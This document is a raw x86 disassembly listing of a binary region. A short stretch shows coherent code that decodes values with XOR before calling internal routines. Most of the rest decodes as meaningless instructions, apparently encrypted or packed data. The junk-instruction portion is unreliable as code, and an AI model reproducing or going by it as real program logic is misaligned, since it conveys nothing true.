  408198:	mov    ch,0x72
  40819a:	cs inc edi
  40819c:	cmp    al,0x8e
  40819e:	cmp    BYTE PTR [esi],dh
  4081a0:	mov    eax,0x6a0014fe
  4081a5:	test   eax,ecx
  4081a7:	into   
  4081a8:	popa   
  4081a9:	retf   
  4081aa:	dec    esi
  4081ab:	repnz out dx,al
  4081ad:	enter  0xd1b,0x84
  4081b1:	mov    eax,edi
  4081b3:	call   0x8816:0xee84e43c
  4081ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bb:	xchg   ebp,eax
  4081bc:	mov    ds:0xadc5b1c9,al
  4081c1:	push   ss
  4081c2:	jae    0x408160
  4081c4:	jecxz  0x4081fe
  4081c6:	push   0x9ca0e3c1
  4081cb:	and    eax,0x58be3d14
  4081d0:	or     DWORD PTR [esi+eax*2+0x61],edx
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	pop    esi
  408269:	dec    edi
  40826a:	outs   dx,DWORD PTR ds:[esi]
  40826b:	aam    0x37
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40824d
  408275:	push   eax
  408276:	push   esp
  408277:	aam    0xc1
  408279:	ret    
  40827a:	sahf   
  40827b:	aam    0x9f
  40827d:	ins    BYTE PTR es:[edi],dx
  40827e:	nop
  40827f:	gs xchg esi,eax
  408281:	pop    eax
  408282:	cdq    
  408283:	cmp    cl,BYTE PTR [esi]
  408285:	retf   
  408286:	ss mov ah,0x95
  408289:	fisttp DWORD PTR [esi+0xc537524]
  40828f:	popf   
  408290:	dec    ecx
  408291:	std    
  408292:	xchg   DWORD PTR [eax-0x16fb48c6],edx
  408298:	adc    eax,0xbe0ac517
  40829d:	inc    esi
  40829e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829f:	mov    esi,0x4a5828b6
  4082a4:	cwde   
  4082a5:	bound  esp,QWORD PTR ds:0x9d336301
  4082ab:	ins    BYTE PTR es:[edi],dx
  4082ac:	inc    edi
  4082ad:	jbe    0x4082ff
  4082af:	aad    0xcc
  4082b1:	add    BYTE PTR [ebp+0xf06bced],al
  4082b7:	sub    DWORD PTR [ebx-0x2c],ecx
  4082ba:	imul   ebx,DWORD PTR [edi],0x6a
  4082bd:	mov    BYTE PTR [esi+0xd7fdd74],ch
  4082c3:	dec    esp
  4082c4:	cwde   
  4082c5:	or     DWORD PTR [eax-0x7c],esi
  4082c8:	cmp    BYTE PTR [edx],cl
  4082ca:	cmp    al,0xd
  4082cc:	and    bh,BYTE PTR [eax]
  4082ce:	lods   eax,DWORD PTR ds:[esi]
  4082cf:	stos   DWORD PTR es:[edi],eax
  4082d0:	sub    DWORD PTR [ebx],esi
  4082d2:	sbb    BYTE PTR [ebx+ecx*1],ch
  4082d5:	mov    al,0xdc
  4082d7:	mov    ecx,DWORD PTR [esi]
  4082d9:	test   eax,0xed509412
  4082de:	xchg   edi,eax
  4082e0:	and    dl,al
  4082e2:	or     al,0xe2
  4082e4:	(bad)  
  4082e5:	outs   dx,BYTE PTR ds:[esi]
  4082e6:	mov    bh,0x20
  4082e8:	(bad)  
  4082e9:	fcomp  DWORD PTR [esi]
  4082eb:	mov    DWORD PTR [eax+0x23],ecx
  4082ee:	fs pusha 
  4082f0:	scas   eax,DWORD PTR es:[edi]
  4082f1:	mov    edi,0xa7d1ba89
  4082f6:	sbb    al,0xea
  4082f8:	dec    esp
  4082f9:	imul   esi,DWORD PTR [edi+0x4228d7ae],0x7a7db48d
  408303:	das    
  408304:	push   0xffffffb2
  408306:	jb     0x408367
  408308:	test   eax,0xcaf4909b
  40830d:	clc    
  40830e:	scas   eax,DWORD PTR es:[edi]
  40830f:	int    0xb2
  408311:	test   DWORD PTR [ecx+0x73],esi
  408314:	ins    DWORD PTR es:[edi],dx
  408315:	sbb    eax,0x889ce756
  40831a:	popa   
  40831b:	test   eax,0xf5268ea8
  408320:	lea    ebx,[eax-0x59a35365]
  408326:	and    al,0xeb
  408328:	sbb    eax,0xd087c47a
  40832d:	test   BYTE PTR [esi],0x24
  408330:	mov    ds:0x4dab159a,eax
  408335:	inc    edi
  408336:	bound  eax,QWORD PTR [ecx]
  408338:	add    ecx,esp
  40833a:	test   eax,0xb2de3906
  40833f:	dec    esp
  408340:	or     al,0x90
  408342:	inc    edx
  408343:	pusha  
  408344:	push   esp
  408345:	in     eax,dx
  408346:	inc    esi
  408347:	add    BYTE PTR [eax+0x199fddd0],ah
  40834d:	push   es
  40834e:	test   BYTE PTR [ebp+ebx*4+0x7a7092e1],dl
  408355:	xchg   DWORD PTR [edx-0x7a5eff15],ebx
  40835b:	adc    cl,bl
  40835d:	sar    BYTE PTR [edx],cl
  40835f:	xchg   esi,eax
  408360:	aas    
  408361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408362:	loope  0x408327
  408364:	xor    al,BYTE PTR [ecx+eiz*1-0xb2718be]
  40836b:	ss cdq 
  40836d:	lea    ecx,[esi]
  40836f:	scas   al,BYTE PTR es:[edi]
  408370:	mov    bl,0x7d
  408372:	and    al,0x86
  408374:	adc    edx,DWORD PTR [ecx+0x124ad708]
  40837a:	mov    ah,0xd3
  40837c:	scas   eax,DWORD PTR es:[edi]
  40837d:	mov    ebp,DWORD PTR [eax]
  40837f:	pusha  
  408380:	mov    dh,0x25
  408382:	clc    
  408383:	adc    al,0x49
  408385:	cmp    DWORD PTR [edx+0x49ece56d],edi
  40838b:	jl     0x408337
  40838d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838e:	xchg   edx,eax
  40838f:	jbe    0x4083e0
  408391:	dec    esp
  408392:	pop    esp
  408393:	push   esp
  408394:	xchg   ebx,eax
  408395:	push   edx
  408396:	jb     0x408330
  408398:	jne    0x4083b2
  40839a:	std    
  40839b:	sub    al,0xf9
  40839d:	pop    ebp
  40839e:	mov    ds:0xd1018a,al
  4083a3:	rol    ecx,1
  4083a5:	arpl   bp,bp
  4083a7:	inc    ecx
  4083a8:	pop    ebp
  4083a9:	fwait
  4083aa:	cmp    edi,DWORD PTR [ebx]
  4083ac:	fdivr  QWORD PTR [esi]
  4083ae:	int    0x4d
  4083b0:	aad    0x29
  4083b2:	mov    al,0x9e
  4083b4:	stc    
  4083b5:	shl    DWORD PTR [eax+edx*4-0x42],1
  4083b9:	nop
  4083ba:	test   al,0x2
  4083bc:	add    eax,0x19576b5f
  4083c1:	sbb    dl,BYTE PTR [ebp+0x38]
  4083c4:	mov    WORD PTR [ebx+0x908f8ad],?
  4083ca:	xchg   BYTE PTR [ebx],bh
  4083cc:	dec    ecx
  4083cd:	out    dx,eax
  4083ce:	add    eax,ebx
  4083d0:	or     DWORD PTR [ebp-0x63],0xffffff8c
  4083d4:	inc    ebp
  4083d5:	leave  
  4083d6:	adc    DWORD PTR [ecx],0xffffff9e
  4083d9:	xchg   ecx,eax
  4083da:	jns    0x4083f6
  4083dc:	push   es
  4083dd:	lea    ebx,ds:[esi]
  4083e0:	int    0xe5
  4083e2:	push   ss
  4083e3:	jb     0x40844a
  4083e5:	adc    ecx,DWORD PTR [ebp+eax*4-0x1f]
  4083e9:	adc    al,0x60
  4083eb:	dec    edi
  4083ec:	repz arpl WORD PTR [ecx-0x70],ax
  4083f0:	mov    cl,0x10
  4083f2:	mov    bl,0x61
  4083f4:	jle    0x408415
  4083f6:	pop    esi
  4083f7:	lea    ebp,[eax+0x59]
  4083fa:	push   edx
  4083fb:	mov    esp,esp
  4083fd:	pop    es
  4083fe:	stos   BYTE PTR es:[edi],al
  4083ff:	jmp    0x6a614cc
  408404:	xchg   edx,eax
  408405:	pop    es
  408406:	ftst   
  408408:	push   edx
  408409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40840a:	adc    bl,BYTE PTR [edi]
  40840c:	mov    eax,ds:0x21fc77f8
  408411:	pop    ss
  408412:	not    DWORD PTR [ecx+0x5e]
  408415:	(bad)  
  408416:	jae    0x408464
  408418:	and    eax,0xbc86648e
  40841d:	inc    esi
  40841e:	rol    BYTE PTR [ebx-0x70fd4264],1
  408424:	adc    BYTE PTR [edx-0x4ecac8f2],cl
  40842a:	pop    edi
  40842b:	mov    WORD PTR [esi-0x3a093f3f],?
  408431:	ror    ecx,1
  408433:	call   0x6d6f:0x8dda0d70
  40843a:	mov    al,0x5c
  40843c:	mov    edi,0x4e816e4
  408441:	(bad)  
  408442:	pushf  
  408443:	jns    0x4083f4
  408445:	cwde   
  408446:	out    dx,eax
  408447:	sub    DWORD PTR [edi+0x7b],edi
  40844a:	sub    BYTE PTR [ecx],dh
  40844c:	push   ds
  40844d:	and    al,0x75
  40844f:	int    0x48
  408451:	outs   dx,DWORD PTR ds:[esi]
  408452:	and    edi,DWORD PTR [ebx]
  408454:	pusha  
  408455:	cmp    ebx,ebx
  408457:	loopne 0x40842f
  408459:	loopne 0x4083ed
  40845b:	pop    ebx
  40845c:	pop    ebp
  40845d:	int    0x32
  40845f:	mov    ds:0x50c93de1,al
  408464:	mov    dl,0x11
  408466:	int3   
  408467:	inc    ebp
  408468:	sub    bl,al
  40846a:	mov    ds:0xd3d8b121,al
  40846f:	and    al,0xf6
  408471:	mov    al,ds:0x5adee9b5
  408476:	jecxz  0x408498
  408478:	mov    esp,0x2047770c
  40847d:	lods   eax,DWORD PTR ds:[esi]
  40847e:	jne    0x4084fd
  408480:	ret    
  408481:	retf   
  408482:	inc    eax
  408483:	adc    BYTE PTR [esi+0x46],ah
  408486:	pop    ebx
  408487:	jge    0x408440
  408489:	fwait
  40848a:	cmp    DWORD PTR [edx],eax
  40848c:	repnz fdiv QWORD PTR [edx+0x6]
  408490:	sbb    dl,BYTE PTR [ecx+0xd]
  408493:	jne    0x4084bd
  408495:	scas   eax,DWORD PTR es:[edi]
  408496:	xchg   ebx,eax
  408497:	cmp    eax,0x8245fff7
  40849c:	repnz add eax,DWORD PTR [ebp-0x6a4e885]
  4084a3:	sbb    edx,DWORD PTR [eax-0xf017b6e]
  4084a9:	fmul   DWORD PTR [eax-0x6af74333]
  4084af:	icebp  
  4084b0:	and    al,0xff
  4084b2:	shr    DWORD PTR [edx+0x13cdeecd],cl
  4084b8:	fmul   QWORD PTR [edx+0x2d]
  4084bb:	mov    ch,0x34
  4084bd:	fisubr DWORD PTR [ebx-0x4b471ca9]
  4084c3:	pop    edi
  4084c4:	mov    edi,0xc295cd72
  4084c9:	lods   al,BYTE PTR ds:[esi]
  4084ca:	dec    ecx
  4084cb:	inc    edx
  4084cc:	jbe    0x40845e
  4084ce:	mov    bl,BYTE PTR [eax]
  4084d0:	mov    cl,0xd8
  4084d2:	add    esp,DWORD PTR [edi]
  4084d4:	xor    eax,0xa3854240
  4084d9:	daa    
  4084da:	sub    al,0xe1
  4084dc:	inc    ebx
  4084dd:	push   ecx
  4084de:	adc    al,ah
  4084e0:	inc    ebx
  4084e1:	(bad)  [ecx]
  4084e3:	das    
  4084e4:	es mov bl,0x6f
  4084e7:	loop   0x408535
  4084e9:	add    edi,edx
  4084eb:	inc    ecx
  4084ec:	sub    ah,BYTE PTR [eax-0x2a]
  4084ef:	hlt    
  4084f0:	xor    BYTE PTR [eax-0x5c57220f],cl
  4084f6:	ja     0x4084c3
  4084f8:	and    eax,0x28cbf7f4
  4084fd:	test   eax,0x8ce1188d
  408502:	xchg   DWORD PTR [eax+esi*1],ecx
  408505:	inc    DWORD PTR [ecx-0x5be1eac2]
  40850b:	inc    esi
  40850c:	dec    ebx
  40850d:	inc    ebp
  40850e:	mov    eax,0x3920f225
  408513:	mov    ebp,0x2504b8c4
  408518:	je     0x4084a6
  40851a:	xor    al,0xc6
  40851c:	ret    0x78df
  40851f:	inc    edi
  408520:	mov    edx,0x2b722fd6
  408525:	dec    ebx
  408526:	adc    DWORD PTR [esp+esi*1+0x12e0c81],esp
  40852d:	push   edi
  40852e:	ss test eax,0x7a244c15
  408534:	dec    esp
  408535:	pop    es
  408536:	mov    bl,0x18
  408538:	call   0xac535d3a
  40853d:	and    al,0x3b
  40853f:	mov    ecx,0xac52ee81
  408544:	test   BYTE PTR [ecx+0x268b4407],bh
  40854a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40854b:	(bad)  
  40854c:	aam    0x79
  40854e:	jbe    0x4084f6
  408550:	cmp    esp,DWORD PTR [ebx+ebx*1]
  408553:	jne    0x40856f
  408555:	data16 mov ?,WORD PTR [ebx]
  408558:	pop    ebp
  408559:	(bad)  
  40855a:	fld    QWORD PTR [ebp+eax*1+0x5f]
  40855e:	(bad)  
  408560:	lods   eax,DWORD PTR ds:[esi]
  408561:	jbe    0x4085ce
  408563:	xor    dl,al
  408565:	stos   BYTE PTR es:[edi],al
  408566:	int3   
  408567:	stos   DWORD PTR es:[edi],eax
  408568:	in     al,dx
  408569:	lock jecxz 0x408519
  40856c:	mov    bh,0x5c
  40856e:	and    eax,0xc910142f
  408573:	or     al,0x14
  408575:	ins    BYTE PTR es:[edi],dx
  408576:	jmp    0x59b5:0xbc4d3324
  40857d:	mov    cl,0x7d
  40857f:	sbb    DWORD PTR [ecx],ebx
  408581:	cld    
  408582:	sub    al,0x23
  408584:	in     eax,0x5a
  408586:	dec    ebp
  408587:	fdiv   DWORD PTR [ecx]
  408589:	in     eax,0x48
  40858b:	lock sub eax,0xeea70fa4
  408591:	test   edx,0xae8586c5
  408597:	sub    DWORD PTR [ebx+0x7747da80],edx
  40859d:	leave  
  40859e:	in     eax,dx
  40859f:	push   edi
  4085a0:	int    0x62
  4085a2:	and    al,0x70
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x64c4a691
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x40858a
  4085c4:	mov    esi,0xb71edadf
  4085c9:	jb     0x4085ad
  4085cb:	shr    BYTE PTR [esp+edx*4-0x67],0xce
  4085d0:	mov    al,0x34
  4085d2:	es sbb al,0xa0
  4085d5:	test   al,0xdd
  4085d7:	mov    cl,0x29
  4085d9:	xchg   BYTE PTR ss:[ecx+eiz*2+0x74],cl
  4085de:	ja     0x408623
  4085e0:	xchg   esi,eax
  4085e1:	stos   DWORD PTR es:[edi],eax
  4085e2:	push   0x3d
  4085e4:	add    DWORD PTR [ecx-0x31f4e6bc],0x44224ab4
  4085ee:	cmp    esi,DWORD PTR [edx-0x5a]
  4085f1:	jnp    0x4085ab
  4085f3:	scas   eax,DWORD PTR es:[edi]
  4085f4:	sub    cl,BYTE PTR [edx]
  4085f6:	mov    bl,0xbf
  4085f8:	fwait
  4085f9:	(bad)  
  4085fa:	in     al,0xb0
  4085fc:	push   edx
  4085fd:	pusha  
  4085fe:	imul   edi,DWORD PTR [eax+0x73595ce],0xffffff81
  408605:	sbb    bl,ah
  408607:	push   ss
  408608:	and    ebp,DWORD PTR [ebx+0x74]
  40860b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860c:	in     al,0x2
  40860e:	test   ebx,0x497e2886
  408614:	xor    edx,ebp
  408616:	outs   dx,DWORD PTR ds:[esi]
  408617:	ss and al,0xcf
  40861a:	ret    
  40861b:	push   ebx
  40861c:	jo     0x4085ad
  40861e:	cmp    esp,edx
  408620:	push   eax
  408621:	aaa    
  408622:	pop    edx
  408623:	mov    cl,BYTE PTR [ecx]
  408625:	mov    ecx,0x8cac5c8e
  40862a:	into   
  40862b:	cmc    
  40862c:	sbb    BYTE PTR [esi+0xc],0x67
  408630:	xchg   BYTE PTR [ecx+0x7cc232e5],cl
  408636:	xchg   BYTE PTR [ecx-0x77836c7f],bl
  40863c:	out    dx,al
  40863d:	pop    ebx
  40863e:	inc    ecx
  40863f:	inc    edx
  408640:	jbe    0x408653
  408642:	and    eax,edx
  408644:	arpl   WORD PTR [ecx-0x10],dx
  408647:	add    ecx,edx
  408649:	inc    esi
  40864a:	lock into 
  40864c:	jmp    0x43b35c2e
  408651:	rol    DWORD PTR [edx-0x2543801c],1
  408657:	cmp    ah,BYTE PTR [edx]
  408659:	and    eax,0x25575ddb
  40865e:	mov    bh,0xe5
  408660:	mov    edx,0x2cf11062
  408665:	dec    ebp
  408666:	sahf   
  408667:	cmp    al,0x35
  408669:	add    ebx,DWORD PTR [eax+0x5b]
  40866c:	out    0x68,al
  40866e:	pushf  
  40866f:	mov    cl,ah
  408671:	out    0x27,al
  408673:	pop    ss
  408674:	out    0x79,eax
  408676:	jnp    0x408651
  408678:	inc    ebp
  408679:	(bad)  
  40867a:	adc    DWORD PTR [ebp-0x64],0x37
  40867e:	push   eax
  40867f:	call   0x6e56:0x115f4f9e
  408686:	push   ebx
  408687:	pop    ebx
  408688:	cld    
  408689:	mov    dh,0x8a
  40868b:	mov    bh,0xd5
  40868d:	mov    bl,0x84
  40868f:	pop    ebx
  408690:	aas    
  408691:	push   ecx
  408692:	add    ch,BYTE PTR [eax+0x1fcdb4ed]
  408698:	in     eax,dx
  408699:	aas    
  40869a:	or     eax,0x69c42f35
  40869f:	mov    eax,0x6574fe90
  4086a4:	sbb    al,0x84
  4086a6:	or     al,0x76
  4086a8:	dec    esp
  4086a9:	xchg   ecx,eax
  4086aa:	sub    cl,BYTE PTR [edi]
  4086ac:	mov    cl,0x21
  4086ae:	mov    ss,WORD PTR [edi]
  4086b0:	dec    ebx
  4086b1:	xchg   esi,eax
  4086b2:	out    dx,al
  4086b3:	aad    0x3d
  4086b5:	jmp    esi
  4086b7:	mov    ebp,0x7612b222
  4086bc:	dec    edx
  4086bd:	sbb    ebx,edi
  4086bf:	pop    es
  4086c0:	jmp    0xc5fb51e5
  4086c5:	xor    al,0x68
  4086c7:	aaa    
  4086c8:	push   0x6bf04d94
  4086cd:	shl    ch,cl
  4086cf:	push   0x4cc63b5
  4086d4:	das    
  4086d5:	dec    esp
  4086d6:	pushf  
  4086d7:	test   al,0xf4
  4086d9:	jmp    0x408738
  4086db:	push   0x2a
  4086dd:	or     eax,0x8ab2485f
  4086e2:	jle    0x4086d1
  4086e4:	out    dx,al
  4086e5:	stc    
  4086e6:	adc    al,0xf4
  4086e8:	fnstsw WORD PTR [bp+0x1a]
  4086ec:	mov    bh,0x3b
  4086ee:	aam    0x12
  4086f0:	pusha  
  4086f1:	pop    ds
  4086f2:	or     bl,bh
  4086f4:	dec    eax
  4086f5:	pop    ds
  4086f6:	fdivr  st,st(2)
  4086f8:	ret    0x3d9d
  4086fb:	adc    eax,0x30b1faa9
  408700:	pop    edi
  408701:	xchg   DWORD PTR [edi+0x5],ecx
  408704:	out    0xbf,eax
  408706:	dec    ecx
  408707:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  408709:	or     edi,DWORD PTR [eax]
  40870b:	or     eax,ecx
  40870d:	mov    fs:0x249856ad,al
  408713:	outs   dx,DWORD PTR ds:[esi]
  408714:	(bad)  
  408715:	mov    esp,0xb4b8ed9
  40871a:	mov    cs,WORD PTR [edi-0x4a]
  40871d:	or     BYTE PTR [esi+0x53],dh
  408720:	pop    edx
  408721:	cmp    dl,bh
  408723:	add    BYTE PTR [ecx+0x789180e6],bl
  408729:	cmp    DWORD PTR [esi+eax*2-0x44],ebp
  40872d:	jmp    0x4087ab
  40872f:	xor    DWORD PTR [eax-0x46],esp
  408732:	fs out dx,eax
  408734:	or     BYTE PTR [ecx+esi*1+0x3a],ch
  408738:	adc    eax,esp
  40873a:	inc    ebx
  40873b:	mov    eax,DWORD PTR [ecx-0x50]
  40873e:	xor    BYTE PTR [eax+0x2861b5e9],cl
  408744:	push   0x5014183f
  408749:	cs popf 
  40874b:	cmp    DWORD PTR [eax+eax*1-0x41f9b9ef],0xffffff91
  408753:	fld    DWORD PTR [ebp+0x2b]
  408756:	out    0xa1,al
  408758:	jnp    0x408746
  40875a:	mov    al,0xe9
  40875c:	test   BYTE PTR [edx+0x57],dl
  40875f:	cmp    ebx,DWORD PTR [edi]
  408761:	aad    0x4
  408763:	jmp    0xcb24:0xe616462a
  40876a:	push   es
  40876b:	push   ds
  40876c:	das    
  40876d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40876e:	fsin   
  408770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408771:	sub    ah,ah
  408773:	stos   BYTE PTR es:[edi],al
  408774:	push   cs
  408775:	cmc    
  408776:	or     al,0xb5
  408778:	pop    eax
  408779:	or     al,0x22
  40877b:	jge    0x40877a
  40877d:	cli    
  40877e:	into   
  40877f:	ja     0x4087e7
  408781:	dec    esp
  408782:	adc    esp,ebp
  408784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408785:	test   dh,bl
  408787:	(bad)  
  408788:	inc    eax
  408789:	aas    
  40878a:	pop    edi
  40878b:	mov    edx,0x795d2b75
  408790:	je     0x4087e0
  408792:	call   edx
  408794:	add    DWORD PTR [eax],0x5
  408797:	mov    ds:0x6bcab57a,al
  40879c:	jb     0x40875c
  40879e:	int3   
  40879f:	je     0x4087d6
  4087a1:	jp     0x408794
  4087a3:	sti    
  4087a4:	mov    dh,0x32
  4087a6:	sbb    edx,esi
  4087a8:	xchg   edx,eax
  4087a9:	repnz mov esp,0x3cda063a
  4087af:	fwait
  4087b0:	mov    dl,0x18
  4087b2:	xchg   DWORD PTR [eax+0x4156b6d4],edx
  4087b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b9:	arpl   si,bp
  4087bb:	and    cl,0xb0
  4087be:	adc    cl,BYTE PTR [edx]
  4087c0:	aaa    
  4087c1:	jns    0x40880e
  4087c3:	loope  0x408761
  4087c5:	and    BYTE PTR [ebp+ebp*4-0x29],ah
  4087c9:	jns    0x4087d6
  4087cb:	repz pop esp
  4087cd:	jae    0x408805
  4087cf:	mov    ah,dh
  4087d1:	(bad)  
  4087d3:	pop    ebp
  4087d4:	cmp    al,0xb5
  4087d6:	mov    edx,ecx
  4087d8:	xor    ecx,DWORD PTR [esi+ebp*2+0xa7e5e63]
  4087df:	pop    es
  4087e0:	cmp    eax,0x57a6f05c
  4087e5:	call   0x8d083f0f
  4087ea:	test   BYTE PTR [ecx],bl
  4087ec:	or     al,0xbe
  4087ee:	sahf   
  4087ef:	(bad)  
  4087f0:	cmp    al,0xd4
  4087f2:	or     DWORD PTR [eax],ebp
  4087f4:	mov    al,0x59
  4087f6:	inc    ebp
  4087f7:	xchg   edi,eax
  4087f8:	pop    esi
  4087f9:	add    al,0x27
  4087fb:	cmp    bl,BYTE PTR [ebp+ecx*1+0x12676788]
  408802:	nop
  408803:	es out 0x2d,al
  408806:	loope  0x40883a
  408808:	(bad)  
  408809:	fmul   DWORD PTR [esi]
  40880b:	mov    ds:0x6be46f74,eax
  408810:	retf   
  408811:	in     eax,0x8b
  408813:	inc    ebx
  408814:	shl    ecx,cl
  408816:	mov    WORD PTR [edi+0x746cfb4e],?
  40881c:	fdivr  QWORD PTR [ecx]
  40881e:	add    cl,bh
  408820:	ins    BYTE PTR es:[edi],dx
  408821:	retf   0x37db
  408824:	fcmovnu st,st(0)
  408826:	stos   DWORD PTR es:[edi],eax
  408827:	fistp  WORD PTR [esi-0x4]
  40882a:	fistp  DWORD PTR [ebx]
  40882c:	test   ebx,esi
  40882e:	nop
  40882f:	stc    
  408830:	add    bh,BYTE PTR [edi]
  408832:	mov    bl,ah
  408834:	push   ebp
  408835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408836:	sbb    BYTE PTR [ebp+0x4f4837fa],ah
  40883c:	out    dx,eax
  40883d:	push   ecx
  40883e:	sar    BYTE PTR [ebx-0x30190e06],0x35
  408845:	test   DWORD PTR [edi-0x5f181ce],edx
  40884b:	or     BYTE PTR [ebx],cl
  40884d:	jecxz  0x408829
  40884f:	xchg   esp,eax
  408850:	sub    esp,DWORD PTR [ecx]
  408852:	aad    0x38
  408854:	mov    al,0xce
  408856:	rcr    BYTE PTR [ebx-0x45],0x4f
  40885a:	sbb    eax,0xe793e5ab
  40885f:	std    
  408860:	add    al,0x25
  408862:	or     al,0xd4
  408864:	out    0xae,eax
  408866:	push   esi
  408867:	das    
  408868:	(bad)  
  408869:	mov    edi,0xf6af2d2c
  40886e:	xlat   BYTE PTR ds:[ebx]
  40886f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408870:	ficom  DWORD PTR [ecx+0x5e]
  408873:	jmp    0xc5283cae
  408878:	idiv   DWORD PTR [esi-0x14cb15b0]
  40887e:	adc    ch,BYTE PTR [edi-0x53]
  408881:	mov    esi,0x9960b9e8
  408886:	retf   0x2fca
  408889:	xor    DWORD PTR [edi+0x74],ebp
  40888c:	addr16 jb 0x4088ab
  40888f:	ss jle 0x408850
  408892:	cmc    
  408893:	ret    0xe1a8
  408896:	arpl   WORD PTR [edi],bp
  408898:	retf   
  408899:	mov    ebp,0xaf9c353e
  40889e:	sub    dl,BYTE PTR [ecx-0x11ed16c1]
  4088a4:	jo     0x408895
  4088a6:	imul   esp,DWORD PTR [eax],0xffffff91
  4088a9:	mov    ds:0x893f8c62,al
  4088ae:	jb     0x4088c2
  4088b0:	rcl    BYTE PTR [edi],0x88
  4088b3:	add    ebx,esi
  4088b5:	add    eax,0xdc0a3e72
  4088ba:	ret    
  4088bb:	mov    ebp,0x23760c9
  4088c0:	int    0x13
  4088c2:	imul   eax,edx,0x3c
  4088c5:	es jge 0x4088d6
  4088c8:	out    0xaf,eax
  4088ca:	push   es
  4088cb:	sbb    BYTE PTR [esi-0x7],dh
  4088ce:	mov    al,ds:0x4e84bde2
  4088d3:	jmp    0xc8f3:0x342815df
  4088da:	out    dx,eax
  4088db:	fs push ebp
  4088dd:	cli    
  4088de:	clc    
  4088df:	fld    TBYTE PTR [edx+0x40e819e7]
  4088e5:	not    BYTE PTR [esi-0x5c9199ad]
  4088eb:	jge    0x408909
  4088ed:	pop    ebx
  4088ee:	(bad)  
  4088ef:	mov    eax,ds:0x8d2c227f
  4088f4:	inc    ebp
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x56435cff],cl
  40890c:	dec    esp
  40890d:	nop
  40890e:	adc    BYTE PTR [edi+0x207070dc],0x7d
  408915:	jo     0x408987
  408917:	mov    edi,0xc77d93f6
  40891c:	and    ecx,DWORD PTR [edi+0x27]
  40891f:	pushf  
  408920:	in     ax,0xd3
  408923:	inc    ebx
  408924:	sbb    bh,dl
  408926:	(bad)  
  408927:	outs   dx,DWORD PTR ds:[esi]
  408928:	inc    edx
  408929:	sub    eax,0xb4aca809
  40892e:	mov    ah,0x4b
  408930:	jg     0x4088e6
  408932:	jb     0x40899a
  408934:	inc    ebp
  408935:	mov    esp,0x3f85e7e
  40893a:	dec    ebx
  40893b:	js     0x408955
  40893d:	pop    ebx
  40893e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40893f:	xlat   BYTE PTR ds:[ebx]
  408940:	popa   
  408941:	out    0xd0,eax
  408943:	js     0x408901
  408945:	jmp    0xdcb1:0x883ed279
  40894c:	outs   dx,DWORD PTR ds:[esi]
  40894d:	add    bh,BYTE PTR ds:0x9a7324ee
  408953:	pop    edi
  408954:	sbb    esi,esi
  408956:	and    dl,ah
  408958:	fs popa 
  40895a:	js     0x4089cb
  40895c:	jae    0x40894e
  40895e:	(bad)  
  40895f:	int    0x7d
